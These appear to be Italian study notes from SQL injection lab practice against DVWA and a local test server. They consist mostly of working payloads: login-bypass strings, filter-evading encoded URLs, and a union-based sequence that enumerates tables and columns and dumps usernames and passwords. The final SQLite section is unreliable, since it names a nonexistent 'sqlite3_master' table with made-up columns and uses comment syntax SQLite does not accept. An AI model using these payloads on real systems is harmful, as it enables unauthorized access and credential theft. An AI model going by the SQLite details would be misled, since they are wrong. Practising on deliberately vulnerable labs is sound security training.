#Una sql injection consiste nell'inserire all'interno di un form un codice sql che verrà eseguito dal server.

#ES 1:
Inseriamo nel form di login il seguente codice
utente : admin
password : 'OR '1'='1


#In caso alcuni filtri siano presenti 
http://172.17.0.2:8000/login?username=admin&password=%27||%271%27%3C%3E%272
#' || '1' <>'2


#--------------SQL Injectin UNION BASED----------------
Una sql injection union based consiste nell'unire i risultati di più tabelle sql

1) Identifichiamo il numero di colonne della tabella
Il costrutto union richiede che il numero di colonne delle 2 query sia uguale

Ci sono 2 modi : NULL o GROUP BY

1.1) NULL
' UNION SELECT NULL # 
#Se la pagina restituisce un errore allora aggiungiamo un altro null
' UNION SELECT NULL,NULL #


2) Una volta identificato il numero di colonne possiamo provare a recuperare i dati
' UNION SELECT NULL,@@version #
'UNION SELECT NULL,table_name FROM information_schema.tables #'
' union select NULL,@@hostname #
' union select NULL,database() #   
'union select NULL,table_name from information_schema.tables where table_schema='dvwa' #
'union select NULL,column_name from information_schema.columns where table_name='users' #
'union select user,password from users #

#L'url di una sql injection union based è del tipo
http://miosito.com/login?username=admin' UNION SELECT NULL,@@version #


#In altri casi possiamo fare cosi
0.0.0.0:8000/login?username=admin'--&password=anything







http://172.17.0.2:8000/?id=qualcosa' UNION SELECT NULL,...#
http://172.17.0.2:8000/?id=0 UNION SELECT NULL,NULL #
http://172.17.0.2:8000/?id=0%20UNION%20SELECT%20NULL,NULL,null,NULL%20#

sqlite3_master con le seguenti colonne: table_name, column_number, column_names 
'union select NULL,NULL,NULL,table_name from sqlite3_master #
http://172.17.0.2:8000/?id=0%20UNION%20SELECT%20NULL,NULL,null,table_name%20from%20sqlite3_master%20#

--> utonti

'union select NULL,column_names from sqlite3_master where table_name='utonti' #
--> usarname&name&surname&passweerd

'union select usarname,name,surname,passweerd from utonti #